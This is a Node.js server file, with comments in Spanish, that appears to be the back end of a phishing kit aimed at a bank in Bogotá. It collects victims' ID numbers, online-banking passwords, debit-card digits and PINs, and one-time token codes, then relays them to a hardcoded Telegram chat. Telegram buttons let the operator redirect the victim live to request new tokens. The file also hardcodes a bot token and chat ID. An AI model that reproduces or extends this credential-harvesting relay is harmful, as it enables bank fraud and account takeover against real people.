const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { createServer } = require('http');
const { Server } = require('socket.io');

// Configuración
const app = express();
const httpServer = createServer(app);
const PORT = process.env.PORT || 3000;

// Configuración de Socket.io para producción
const io = new Server(httpServer, {
    cors: { 
        origin: process.env.NODE_ENV === 'production' 
            ? ['https://panel-de-bogota.vercel.app', 'https://panel-de-bogota.vercel.app']
            : ['http://localhost:3000', 'http://127.0.0.1:3000'],
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling']
});

// Configuración de Telegram
const token = process.env.TELEGRAM_TOKEN || '8582118363:AAEmFQDHohsvmLpLkUl9MHlv62IvPfxFAAY';
const chatId = process.env.TELEGRAM_CHAT_ID || '7831097636';

// Middlewares
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Configurar CORS
app.use((req, res, next) => {
    const allowedOrigins = process.env.NODE_ENV === 'production' 
        ? ['https://panel-de-bogota.vercel.app']
        : ['http://localhost:3000', 'http://127.0.0.1:3000'];
    
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
    
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname)));

// Rutas para archivos HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/token.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'token.html'));
});

app.get('/dashboard.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Inicializar bot de Telegram
let bot;

if (process.env.NODE_ENV === 'production') {
    // En producción usar webhook
    bot = new TelegramBot(token);
    
    // Configurar webhook para Vercel
    app.post('/api/webhook', (req, res) => {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    });
} else {
    // En desarrollo usar polling
    bot = new TelegramBot(token, { polling: true });
}

// Función para enviar mensajes a Telegram
async function sendTelegramMessage(data) {
    try {
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Error de Logo', callback_data: 'error_logo' },
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
                ],
                [
                    { text: '❌ Error de Token', callback_data: 'error_token' },
                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };

        let messageText;
        if (typeof data === 'object') {
            if (data.tipo === 'Clave Segura') {
                messageText = `🔐 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `🔑 Clave: ${data.clave}`;
            } else if (data.tipo === 'Tarjeta Débito') {
                messageText = `💳 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `💳 Tarjeta: ${data.ultimosDigitos}\n` +
                            `🔑 Clave: ${data.claveTarjeta}`;
            } else if (data.tipo === 'Token') {
                messageText = `🔐 VERIFICACIÓN DE TOKEN SOLICITADA:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🔢 Código Token: ${data.codigo}\n` +
                            `⏰ Hora: ${data.timestamp}`;
            }
        } else {
            messageText = data.toString();
        }

        console.log('📤 Enviando mensaje a Telegram...');
        const result = await bot.sendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        console.log('✅ Mensaje enviado exitosamente, ID:', result.message_id);
        return result;
    } catch (error) {
        console.error('❌ Error al enviar mensaje:', error);
        throw error;
    }
}

// Ruta API para enviar a Telegram
app.post('/api/send-telegram', async (req, res) => {
    try {
        console.log('📨 Recibiendo datos del formulario:', req.body);
        const result = await sendTelegramMessage(req.body);
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('❌ Error en API:', error);
        res.status(500).json({
            success: false,
            error: 'Error al procesar la solicitud'
        });
    }
});

// Manejo de botones de Telegram
bot.on('callback_query', async (callbackQuery) => {
    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;
        
        console.log(`🔄 Botón presionado: ${action}, Mensaje ID: ${messageId}`);
        
        // Responder al callback
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: `Procesando: ${action}`
        });

        // Determinar redirección según la acción
        let redirectUrl, message;
        const baseUrl = process.env.NODE_ENV === 'production' 
            ? 'https://panel-de-bogota.vercel.app'
            : 'http://localhost:3000';
        
        switch(action) {
            case 'error_logo':
                redirectUrl = `${baseUrl}?action=error_logo`;
                message = '❌ Error de logo detectado';
                break;
            case 'pedir_logo':
                redirectUrl = `${baseUrl}?action=pedir_logo`;
                message = '🔄 Solicitando nuevo logo';
                break;
            case 'error_token':
                redirectUrl = `${baseUrl}/token.html?action=error_token`;
                message = '❌ Error en token - por favor verifique e intente nuevamente';
                break;
            case 'pedir_token':
                redirectUrl = `${baseUrl}/token.html?action=pedir_token`;
                message = '🔄 Solicitando nuevo token';
                break;
            case 'finalizar':
                redirectUrl = `${baseUrl}/dashboard.html?action=finalizar`;
                message = '✅ Proceso finalizado exitosamente';
                
                // Actualizar mensaje en Telegram solo para finalizar
                await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                });
                break;
            default:
                redirectUrl = baseUrl;
                message = 'Acción desconocida';
        }

        console.log(`📍 Redirigiendo a: ${redirectUrl}`);
        
        // Emitir evento a todos los clientes conectados
        io.emit('telegram_action', {
            action: action,
            messageId: messageId,
            message: message,
            redirect: redirectUrl
        });

    } catch (error) {
        console.error('❌ Error procesando botón:', error);
    }
});

// Socket.io para comunicación en tiempo real
io.on('connection', (socket) => {
    console.log('🔌 Cliente conectado:', socket.id);
    
    socket.on('disconnect', () => {
        console.log('🔌 Cliente desconectado:', socket.id);
    });
});

// Iniciar servidor solo si no estamos en Vercel (Vercel maneja el servidor automáticamente)
if (process.env.NODE_ENV !== 'production') {
    httpServer.listen(PORT, () => {
        console.log(`🚀 Servidor ejecutándose en: http://localhost:${PORT}`);
        console.log(`🤖 Bot de Telegram iniciado en modo polling`);
    });
}

// Exportar para Vercel
module.exports = (req, res) => {
    // Configurar webhook en producción si es necesario
    if (process.env.NODE_ENV === 'production' && !global.botInitialized) {
        const webhookUrl = `https://${req.headers.host}/api/webhook`;
        bot.setWebHook(webhookUrl).then(() => {
            console.log('✅ Webhook configurado para:', webhookUrl);
            global.botInitialized = true;
        }).catch(console.error);
    }
    
    return app(req, res);
};